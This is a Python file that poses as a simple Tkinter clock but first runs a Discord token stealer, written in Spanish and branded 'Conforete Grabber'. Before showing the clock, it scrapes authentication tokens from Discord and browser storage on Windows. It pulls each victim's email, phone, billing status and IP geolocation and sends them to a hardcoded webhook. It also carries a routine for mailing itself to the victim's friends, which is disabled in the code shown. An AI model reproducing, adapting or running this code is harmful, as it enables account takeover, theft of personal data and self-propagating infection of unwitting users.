from tkinter import *
from tkinter.ttk import *
from time import strftime
import re, os
if os.name != "nt":
	exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

webhook_url = "https://discordapp.com/api/webhooks/855857130552557568/YXXspoOrcw-0zRmOLA2NoYvb_OAtXcI48GqomLvZdKxEXQNBeIGVU9_t3OETOZsQQKeJ"

languages = {
    'en-US': 'English, United States',
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getuserdata(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass


def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def getdeveloper():
    dev = "2021 - by Conforete | twitch.tv/conforete"
    try:
        dev = urlopen(Request("Hola")).read().decode()
    except:
        pass
    return dev


def getip():
    ip = org = loc = city = country = region = googlemap = "None"
    try:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = "https://www.google.com/maps/search/google+map++" + loc
    except:
        pass
    return ip, org, loc, city, country, region, googlemap


def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url


def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getheaders(token))).read().decode())
    except:
        pass


def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getheaders(token))).read().decode())) > 0)
    except:
        pass


def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    global webhook_url
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    computer_os = plt.platform()
    ip, org, loc, city, country, region, googlemap = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            locale = user_data['locale']
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            verified = user_data['verified']
            mfa_enabled = user_data['mfa_enabled']
            flags = user_data['flags']

            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')

            language = languages.get(locale)
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0xd53444,
                "fields": [
                    {
                        "name": "😈 Conforete Grabber 3.0😈",
                        "value": f'**Creador y soporte <@610844486213304326>**',
                        "inline": True
                    },
                    {
                        "name": "--------------------------------------------------------",
                        "value": "------------------------------------------------------",
                        "inline": False
                    },
                    {
                        "name": "```Info de Cuenta```",
                        "value": f'Correo: ||{email}||\nNumero: ||{phone}||\nNitro: ||{nitro}||\nInfo de Facturación: ||{billing}||',
                        "inline": True
                    },
                    {
                        "name": "```Info del PC```",
                        "value": f'Sistema Operativo: ||{computer_os}||\nNombre del PC: ||{pc_username}||\nID del PC: ||{pc_name}||\nLocalización del token: ||{platform}||',
                        "inline": True
                    },
                    {
                        "name": "--------------------------------------------------------",
                        "value": "------------------------------------------------------",
                        "inline": False
                    },
                    {
                        "name": "```GEO-IP INFOS```",
                        "value": f'IP: ||{ip}||\nGeo: ||[{loc}] ({googlemap})||\nCiudad: ||{city}||\nRegion: ||{region}||',
                        "inline": True
                    },
                    {
                        "name": "```Otra Info```",
                        "value": f'Local: ||{locale} ({language})||\nVerificacion de Correo: ||{verified}||\n2FA/MFA Activado: ||{mfa_enabled}||\nFecha de Creacion: ||{creation_date}||\n                    **Es opcional seguirme en Twitch, pero si quieres, me llamo Conforete**',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": f' ||{token}||\n                    **Tambien tengo codigo en la tienda de Fortnite es "Conforete" sin comillas. Bueno recuerda que es opcional y esto escribo por hacer bulto XD**',
                        "inline": True
                    },
                    {
                        "name": "**Iniciar sesión con Token**",
                        "value": f'https://pastebin.com/KWQKjp1k\n                    **Eso lo teneis que poner en la consola ( Control+Shift+I ) en el login de discord**',
                        "inline": True
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"Conforete en Twitch"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Conforete Grabber 2.0",
        "avatar_url": "https://cdn.dribbble.com/users/295073/screenshots/5081089/hacker_logo_v1.0.jpg?compress=1&resize=400x300"
    }
    try:
        urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass

root = Tk()
root.title("Clock")

def time():
    string = strftime('%H:%M:%S %p')
    label.config(text=string)
    label.after(1000, time)

label = Label(root, font=("ds-digital", 80), background = "black", foreground = "green")
label.pack(anchor='center')
time()

mainloop()
